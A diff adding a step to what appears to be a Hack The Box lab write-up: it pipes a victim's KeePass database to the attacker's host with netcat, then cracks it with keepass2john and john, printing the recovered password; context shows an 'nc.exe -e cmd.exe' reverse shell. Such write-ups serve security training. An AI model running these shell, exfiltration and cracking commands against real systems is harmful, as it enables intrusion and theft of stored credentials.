@@ -102,6 +102,45 @@ nc.exe -e cmd.exe 10.10.14.117 1234
 
 And it's good.
 
+
+For extracting the file :
+
+Attacker :
+```BASH
+nc -l -p 12345 > file.kdbx
+```
+
+Victim :
+```POWERSHELL
+nc.exe 10.10.14.117 12345 < C:\Users\kohsuke\Documents\CEH.kdbx
+```
+
+And now we have the .kdbx file.
+
+Now we want to crack the file so we start with 
+
+```BASH
+keepass2john file.kdbx > unfile.hash
+```
+
+```BASH
+┌─[eu-dedivip-1]─[10.10.14.117]─[bobinette@htb-yfwujbxq4p]─[~]
+└──╼ [★]$ john --wordlist=/home/bobinette/Desktop/rockyou.txt unfile.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 6000 for all loaded hashes
+Cost 2 (version) is 2 for all loaded hashes
+Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+moonshine1       (file)     
+1g 0:00:00:11 DONE (2025-04-23 10:24) 0.08403g/s 4619p/s 4619c/s 4619C/s nando1..moonshine1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+So the password is moonshine1
+
 ## 5. **Installation
 
 ## 6. **Command and Control
